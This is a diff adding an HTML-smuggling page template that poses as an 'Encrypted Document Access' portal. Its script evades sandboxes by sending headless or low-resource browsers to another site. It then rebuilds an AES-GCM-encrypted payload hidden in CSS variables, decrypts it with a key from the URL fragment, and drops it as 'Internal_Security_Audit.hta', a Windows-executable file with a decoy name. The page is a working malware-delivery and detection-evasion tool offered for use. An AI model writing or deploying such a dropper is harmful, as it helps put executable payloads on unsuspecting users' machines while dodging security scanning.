@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Portal</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { border: 1px solid #333; padding: 30px; border-radius: 10px; text-align: center; }
+        /* The "Smuggled" chunks will be injected here as CSS variables */
+        :root {
+            --iv: "{{IV}}";
+            --tag: "{{TAG}}";
+            {{CHUNKS}}
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Encrypted Document Access</h2>
+        <p id="msg">Verifying environment...</p>
+        <button id="run" style="display:none; padding: 10px 20px; cursor: pointer;">Download File</button>
+    </div>
+
+    <script>
+        const msg = document.getElementById('msg');
+        const btn = document.getElementById('run');
+
+        // 1. Sandbox Evasion Logic
+        function isSafe() {
+            const isHeadless = navigator.webdriver;
+            const lowCores = navigator.hardwareConcurrency < 2;
+            const tinyScreen = window.screen.width < 100;
+            return !(isHeadless || lowCores || tinyScreen);
+        }
+
+        async function init() {
+            if (!isSafe()) {
+                window.location.href = "https://google.com"; // Redirect bots
+                return;
+            }
+
+            msg.innerText = "Environment Verified. Click to decrypt.";
+            btn.style.display = "inline-block";
+        }
+
+        btn.onclick = async () => {
+            const keyHex = window.location.hash.substring(1);
+            if (!keyHex) { alert("Missing Key"); return; }
+
+            try {
+                // 2. Reassemble pieces from CSS variables
+                const styles = getComputedStyle(document.documentElement);
+                const iv = styles.getPropertyValue('--iv').trim().replace(/"/g, '');
+                const tag = styles.getPropertyValue('--tag').trim().replace(/"/g, '');
+                
+                // Collect all chunks (chunk0, chunk1...)
+                let b64Data = "";
+                let i = 0;
+                while(true) {
+                    let part = styles.getPropertyValue(`--chunk${i}`).trim().replace(/"/g, '');
+                    if (!part) break;
+                    b64Data += part;
+                    i++;
+                }
+
+                // 3. Decrypt
+                const rawKey = new Uint8Array(keyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                const cryptoKey = await crypto.subtle.importKey("raw", rawKey, "AES-GCM", true, ["decrypt"]);
+                
+                const encrypted = Uint8Array.from(atob(b64Data), c => c.charCodeAt(0));
+                const ivArr = Uint8Array.from(atob(iv), c => c.charCodeAt(0));
+                const tagArr = Uint8Array.from(atob(tag), c => c.charCodeAt(0));
+
+                const combined = new Uint8Array(encrypted.length + tagArr.length);
+                combined.set(encrypted);
+                combined.set(tagArr, encrypted.length);
+
+                const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: ivArr }, cryptoKey, combined);
+                
+                // 4. Final Delivery
+                const url = URL.createObjectURL(new Blob([decrypted]));
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "Internal_Security_Audit.hta"; // Using HTA for Pro execution
+                a.click();
+                
+                msg.innerText = "Decryption Complete.";
+            } catch (e) {
+                msg.innerText = "Decryption Failed: Invalid Key.";
+            }
+        };
+
+        window.onload = init;
+    </script>
+</body>
+</html>
